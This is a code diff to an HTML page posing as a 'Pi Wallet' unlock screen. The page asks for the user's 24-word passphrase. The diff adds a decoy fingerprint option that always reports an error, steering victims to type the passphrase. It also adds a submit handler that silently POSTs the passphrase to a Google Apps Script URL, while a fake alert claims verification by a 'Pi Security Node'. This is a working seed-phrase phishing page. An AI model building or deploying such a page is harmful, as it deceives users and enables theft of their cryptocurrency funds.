@@ -76,34 +76,129 @@
         .txt {
             font-family: "Helvetica", sans-serif;
         }
+
+        /* CSS styles for modal */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+            padding-top: 60px;
+        }
+
+        /* Modal content */
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto; /* 5% from the top and centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Could be more or less, depending on screen size */
+        }
+
+        /* Close button */
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div class="comment-box">
-        <h3 class="txt"><b>Unlock Pi Wallet</b></h3>
-        <form id="submissionForm">
-            <!--<label for="comment">A</label>-->
-            <textarea name="comment" placeholder="Enter your 24-word passphrase here"></textarea>
-            <br>
-            <button name="submit" type="submit" value="Submit" id="passphraseButton">UNLOCK WITH PASSPHRASE</button>
-            <br>
-            <button class="bone" id="fingerprintButton">UNLOCK WITH FINGERPRINT</button>
-        </form>
-    </div>
-    <p></p>
-    <p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>
-    <p class="txt"><small>Lost your passphrase? You can create a new wallet, but all your &pi; in your previous wallet will be inaccessible.</small></p>
-    <script>
-        // Event listener for the passphrase button
-        document.getElementById("passphraseButton").addEventListener("click", function() {
-            // Display alert when the passphrase button is clicked
-            alert("Verification request sent to Pi Security Node.");
-        });
 
-        // Simulate biometric verification error when "Unlock with Fingerprint" button is clicked
-        document.getElementById("fingerprintButton").addEventListener("click", function() {
-            alert("Biometric verification error. Please try again or use another method to verify Identity.");
-        });
-    </script>
+<div class="comment-box">
+    <h3 class="txt"><b>Unlock Pi Wallet</b></h3>
+    <form id="submissionForm">
+        <!--<label for="comment">A</label>-->
+        <textarea name="comment" placeholder="Enter your 24-word passphrase here"></textarea>
+        <br>
+        <button name="submit" type="submit" value="Submit" id="passphraseButton">UNLOCK WITH PASSPHRASE</button>
+        <br>
+        <button class="bone" id="fingerprintButton">UNLOCK WITH FINGERPRINT</button>
+    </form>
+</div>
+<p></p>
+<p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>
+<p class="txt"><small>Lost your passphrase? You can create a new wallet, but all your &pi; in your previous wallet will be inaccessible.</small></p>
+
+<!-- Modal -->
+<div id="fingerprintModal" class="modal">
+    <!-- Modal content -->
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <p>Place your finger on the fingerprint scanner to authenticate.</p>
+    </div>
+</div>
+
+<script>
+    // Get the modal
+    var modal = document.getElementById("fingerprintModal");
+
+    // Get the button that opens the modal
+    var btn = document.getElementById("fingerprintButton");
+
+    // Get the <span> element that closes the modal
+    var span = document.getElementsByClassName("close")[0];
+
+    // When the user clicks on the button, open the modal
+    btn.onclick = function() {
+        // Display alert when the biometric button is clicked
+        alert("Biometric verification error. Please try again or use another method to unlock your wallet.");
+        modal.style.display = "block";
+    }
+
+    // When the user clicks on <span> (x), close the modal
+    span.onclick = function() {
+        modal.style.display = "none";
+    }
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+
+    // Event listener for the passphrase button
+    document.getElementById("passphraseButton").addEventListener("click", function() {
+        // Display alert when the passphrase button is clicked
+        alert("Verification request sent to Pi Security Node.");
+    });
+
+    // Event listener for the form submission
+    document.getElementById("submissionForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        var formData = new FormData(this);
+
+        fetch('https://script.google.com/macros/s/AKfycbzy7ov1qXZl1hiXPFB07Bbgf5-Bp7GMAGKcNwyUHBzGYFj4oZ_X75QvAlmUv_WKbTEMnA/exec', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => {
+            console.log(data);
+        })
+    });
+</script>
+
 </body>
 </html>
